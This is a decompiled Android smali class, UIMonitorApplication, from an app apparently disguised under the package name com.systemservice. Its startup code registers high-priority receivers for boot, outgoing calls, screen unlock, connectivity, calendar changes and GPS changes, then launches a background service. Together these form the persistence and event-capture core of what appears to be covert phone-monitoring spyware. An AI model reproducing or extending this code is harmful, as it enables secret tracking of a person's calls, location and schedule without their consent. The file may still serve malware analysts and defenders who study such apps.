.class public abstract Lcom/systemservice/common/groupService/UIMonitorApplication;
.super Landroid/app/Application;
.source ""


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "SimpleDateFormat"
    }
.end annotation


# static fields
.field private static a:Lcom/systemservice/common/groupService/UIMonitorApplication;


# instance fields
.field b:Ljava/text/SimpleDateFormat;

.field private c:Lcom/systemservice/a/b/b;

.field private d:Landroid/content/BroadcastReceiver;

.field private e:Ljava/lang/Thread$UncaughtExceptionHandler;

.field private f:Ljava/lang/Thread$UncaughtExceptionHandler;

.field g:Landroid/content/BroadcastReceiver;

.field h:Landroid/content/BroadcastReceiver;

.field i:Landroid/content/BroadcastReceiver;

.field j:Landroid/content/BroadcastReceiver;

.field k:Landroid/content/BroadcastReceiver;

.field l:Landroid/content/BroadcastReceiver;

.field m:Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Application;-><init>()V

    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "yyyy-MM-dd HH:mm:ss"

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->b:Ljava/text/SimpleDateFormat;

    invoke-static {}, Ljava/lang/Thread;->getDefaultUncaughtExceptionHandler()Ljava/lang/Thread$UncaughtExceptionHandler;

    move-result-object v0

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->e:Ljava/lang/Thread$UncaughtExceptionHandler;

    new-instance v0, Lcom/systemservice/common/groupService/b;

    invoke-direct {v0, p0}, Lcom/systemservice/common/groupService/b;-><init>(Lcom/systemservice/common/groupService/UIMonitorApplication;)V

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->f:Ljava/lang/Thread$UncaughtExceptionHandler;

    new-instance v0, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;

    invoke-direct {v0}, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->g:Landroid/content/BroadcastReceiver;

    new-instance v0, Lcom/systemservice/common/boostReceiver/UIUserInternetReceiver;

    invoke-direct {v0}, Lcom/systemservice/common/boostReceiver/UIUserInternetReceiver;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->h:Landroid/content/BroadcastReceiver;

    new-instance v0, Lcom/systemservice/common/boostReceiver/UIBootReceiver;

    invoke-direct {v0}, Lcom/systemservice/common/boostReceiver/UIBootReceiver;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->i:Landroid/content/BroadcastReceiver;

    new-instance v0, Lcom/systemservice/common/boostReceiver/UIOutGoingCallReceiver;

    invoke-direct {v0}, Lcom/systemservice/common/boostReceiver/UIOutGoingCallReceiver;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->j:Landroid/content/BroadcastReceiver;

    new-instance v0, Lcom/systemservice/common/boostReceiver/PowerStatusReceiver;

    invoke-direct {v0}, Lcom/systemservice/common/boostReceiver/PowerStatusReceiver;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->k:Landroid/content/BroadcastReceiver;

    new-instance v0, Lcom/systemservice/common/features/calendarHistory/CalendarReceiver;

    invoke-direct {v0}, Lcom/systemservice/common/features/calendarHistory/CalendarReceiver;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->l:Landroid/content/BroadcastReceiver;

    new-instance v0, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;

    invoke-direct {v0}, Lcom/systemservice/common/features/gpsHistory/GPSReceiver;-><init>()V

    iput-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->m:Landroid/content/BroadcastReceiver;

    sput-object p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->a:Lcom/systemservice/common/groupService/UIMonitorApplication;

    return-void
.end method

.method public static a()Landroid/content/Context;
    .locals 1

    sget-object v0, Lcom/systemservice/common/groupService/UIMonitorApplication;->a:Lcom/systemservice/common/groupService/UIMonitorApplication;

    return-object v0
.end method

.method static synthetic a(Lcom/systemservice/common/groupService/UIMonitorApplication;)Ljava/lang/Thread$UncaughtExceptionHandler;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->e:Ljava/lang/Thread$UncaughtExceptionHandler;

    return-object p0
.end method

.method static synthetic b(Lcom/systemservice/common/groupService/UIMonitorApplication;)Lcom/systemservice/a/b/b;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->c:Lcom/systemservice/a/b/b;

    return-object p0
.end method


# virtual methods
.method protected final a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V
    .locals 3

    iget-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->c:Lcom/systemservice/a/b/b;

    invoke-virtual {p1}, Lcom/systemservice/a/d/a;->f()Lcom/systemservice/a/d/c;

    invoke-virtual {v0, p1}, Lcom/systemservice/a/b/b;->a(Lcom/systemservice/a/d/c;)V

    invoke-virtual {p1}, Lcom/systemservice/a/d/a;->e()[Ljava/lang/String;

    move-result-object p1

    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    invoke-virtual {p2, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method

.method protected abstract a(Lcom/systemservice/a/d/e;Landroid/content/IntentFilter;)V
.end method

.method public b()Lcom/systemservice/a/b/b;
    .locals 1

    iget-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->c:Lcom/systemservice/a/b/b;

    return-object v0
.end method

.method public onCreate()V
    .locals 8

    const-string v0, "android.intent.action.PROVIDER_CHANGED"

    const-string v1, ""

    const-string v2, "UIAppController"

    invoke-super {p0}, Landroid/app/Application;->onCreate()V

    :try_start_0
    new-instance v3, Landroid/os/StrictMode$VmPolicy$Builder;

    invoke-direct {v3}, Landroid/os/StrictMode$VmPolicy$Builder;-><init>()V

    invoke-virtual {v3}, Landroid/os/StrictMode$VmPolicy$Builder;->build()Landroid/os/StrictMode$VmPolicy;

    move-result-object v3

    invoke-static {v3}, Landroid/os/StrictMode;->setVmPolicy(Landroid/os/StrictMode$VmPolicy;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v3

    :try_start_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    iget-object v3, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->f:Ljava/lang/Thread$UncaughtExceptionHandler;

    invoke-static {v3}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V

    new-instance v3, Lcom/systemservice/a/b/b;

    invoke-direct {v3}, Lcom/systemservice/a/b/b;-><init>()V

    iput-object v3, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->c:Lcom/systemservice/a/b/b;

    new-instance v3, Lcom/systemservice/common/groupService/c;

    invoke-direct {v3, p0}, Lcom/systemservice/common/groupService/c;-><init>(Lcom/systemservice/common/groupService/UIMonitorApplication;)V

    iput-object v3, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->d:Landroid/content/BroadcastReceiver;

    new-instance v3, Landroid/content/IntentFilter;

    invoke-direct {v3}, Landroid/content/IntentFilter;-><init>()V

    iget-object v4, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->c:Lcom/systemservice/a/b/b;

    invoke-virtual {p0, v4, v3}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/e;Landroid/content/IntentFilter;)V

    const/16 v4, 0x3e7

    invoke-virtual {v3, v4}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v5, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->d:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v5, v3}, Landroid/app/Application;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v3, Landroid/content/IntentFilter;

    invoke-direct {v3}, Landroid/content/IntentFilter;-><init>()V

    const-string v5, "android.intent.action.BOOT_COMPLETED"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v5, "android.intent.action.QUICKBOOT_POWERON"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v5, "android.intent.category.DEFAULT"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addCategory(Ljava/lang/String;)V

    invoke-virtual {v3, v4}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v5, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->i:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v5, v3}, Landroid/app/Application;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v3, Landroid/content/IntentFilter;

    invoke-direct {v3}, Landroid/content/IntentFilter;-><init>()V

    const-string v5, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    invoke-virtual {v3, v4}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v5, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->j:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v5, v3}, Landroid/app/Application;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v3, Landroid/content/IntentFilter;

    invoke-direct {v3}, Landroid/content/IntentFilter;-><init>()V

    const-string v5, "android.net.conn.CONNECTIVITY_CHANGE"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v5, "android.intent.action.MY_PACKAGE_REPLACED"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v5, "android.intent.action.PACKAGE_REPLACED"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    invoke-virtual {v3, v4}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v5, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->h:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v5, v3}, Landroid/app/Application;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v3, Landroid/content/IntentFilter;

    invoke-direct {v3}, Landroid/content/IntentFilter;-><init>()V

    const-string v5, "android.intent.action.BATTERY_LOW"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v5, "android.intent.action.BATTERY_OKAY"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    invoke-virtual {v3, v4}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v5, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->k:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v5, v3}, Landroid/app/Application;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v3, Landroid/content/IntentFilter;

    invoke-direct {v3}, Landroid/content/IntentFilter;-><init>()V

    const-string v5, "android.intent.action.SCREEN_OFF"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v5, "android.intent.action.SCREEN_ON"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v5, "android.intent.action.USER_PRESENT"

    invoke-virtual {v3, v5}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    invoke-virtual {v3, v4}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v5, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->g:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v5, v3}, Landroid/app/Application;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v5, Landroid/content/IntentFilter;

    invoke-direct {v5}, Landroid/content/IntentFilter;-><init>()V

    invoke-virtual {v5, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v6, "content"

    invoke-virtual {v5, v6}, Landroid/content/IntentFilter;->addDataScheme(Ljava/lang/String;)V

    const-string v6, "com.android.calendar"

    const/4 v7, 0x0

    invoke-virtual {v5, v6, v7}, Landroid/content/IntentFilter;->addDataAuthority(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v3, v4}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v6, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->l:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v6, v5}, Landroid/app/Application;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v5, Landroid/content/IntentFilter;

    const-string v6, "android.location.PROVIDERS_CHANGED"

    invoke-direct {v5, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    invoke-virtual {v3, v4}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v0, p0, Lcom/systemservice/common/groupService/UIMonitorApplication;->m:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0, v5}, Landroid/app/Application;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v0, Landroid/content/Intent;

    const-class v3, Lcom/systemservice/common/groupService/UIAppSchedulingService;

    invoke-direct {v0, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/app/Application;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    const-string v0, "Initialized successfully!"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_1
    return-void
.end method

.method public onLowMemory()V
    .locals 0

    invoke-super {p0}, Landroid/app/Application;->onLowMemory()V

    return-void
.end method

.method public onTerminate()V
    .locals 0

    invoke-super {p0}, Landroid/app/Application;->onTerminate()V

    return-void
.end method
